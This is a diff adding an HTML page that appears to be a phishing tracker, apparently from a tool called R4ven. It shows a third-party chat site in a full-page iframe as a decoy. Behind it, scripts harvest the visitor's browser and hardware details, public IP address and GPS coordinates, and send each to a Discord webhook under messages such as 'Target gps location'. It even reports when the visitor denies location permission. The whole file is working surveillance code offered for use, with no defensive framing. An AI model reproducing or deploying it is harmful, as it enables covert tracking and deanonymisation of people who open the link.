@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <script type="text/javascript" 
+        src="dwebhook.js">
+    </script>
+</head>
+
+<body onload="getLocation()">
+
+<iframe src="https://www.tohla.com/chat/" width="100%" height="900" style="border:none;">
+</iframe>
+
+<p id="demo"></p>
+<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+</script>
+<script>
+var x = document.getElementById("demo");
+
+var sysinfo = (" GET " , "\n__**Uagent:**__ " + "```xl\n" + navigator.userAgent + "```" + "\n__**AppVersion:**__ " + "```xl\n" + navigator.appVersion + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies Enabled: " + navigator.cookieEnabled + "\nBrowser Language: " + navigator.language + "\nBrowser Name: "+ navigator.appName + "\nBrowser CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU cores: " + navigator.hardwareConcurrency + "\nOscpu: " + navigator.oscpu + "```");
+
+const request = new XMLHttpRequest();
+    request.open("POST", discord.webhook); //change webhook
+
+    request.setRequestHeader('Content-type', 'application/json');
+
+    var myEmbed = {
+      author: {
+        name: "Someone Opened The Link !!"
+      },
+      title: "Target System Information..",
+      description: sysinfo
+    }
+
+    var params = {
+      username: "R4ven",
+      avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
+      embeds: [ myEmbed ]
+    }
+
+    request.send(JSON.stringify(params));
+
+//...
+
+$.getJSON("https://api.ipify.org?format=json", function(data) {
+  $("#gfg").html(data.ip);
+
+  const request = new XMLHttpRequest();
+      request.open("POST", discord.webhook); //change webhook
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var myEmbed = {
+        author: {
+          name: "Grabbed Taregt Ip"
+        },
+        title: "IP address:",
+        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip
+      }
+
+      var params = {
+        username: "R4ven",
+        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
+        embeds: [ myEmbed ]
+      }
+
+      request.send(JSON.stringify(params));
+})
+
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition, showError);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+  var latlong = (" GET " , "```autohotkey\nLatitude:" + position.coords.latitude + "\nLongitude:" + position.coords.longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude);
+  
+  const request = new XMLHttpRequest();
+      request.open("POST", discord.webhook); //change webhook
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var myEmbed = {
+        author: {
+          name: "Allowed Location Permission"
+        },
+        title: "Target gps location...",
+        description: latlong
+      }
+
+      var params = {
+        username: "R4ven",
+        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
+        embeds: [ myEmbed ]
+      }
+
+      request.send(JSON.stringify(params));
+
+}
+
+function showError(error) {
+  switch(error.code) {
+    case error.PERMISSION_DENIED:
+      const request = new XMLHttpRequest();
+      request.open("POST", discord.webhook); //change webhook
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "R4ven",
+        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
+        content: "```diff\n- User denied the request for Geolocation.```"
+      }
+
+      request.send(JSON.stringify(params));
+      break;
+    case error.POSITION_UNAVAILABLE:
+      x.innerHTML = "Location information is unavailable."
+      break;
+    case error.TIMEOUT:
+      x.innerHTML = "The request to get user location timed out."
+      break;
+    case error.UNKNOWN_ERROR:
+      x.innerHTML = "An unknown error occurred."
+      break;
+  }
+}
+</script>
+</body>
+</html>
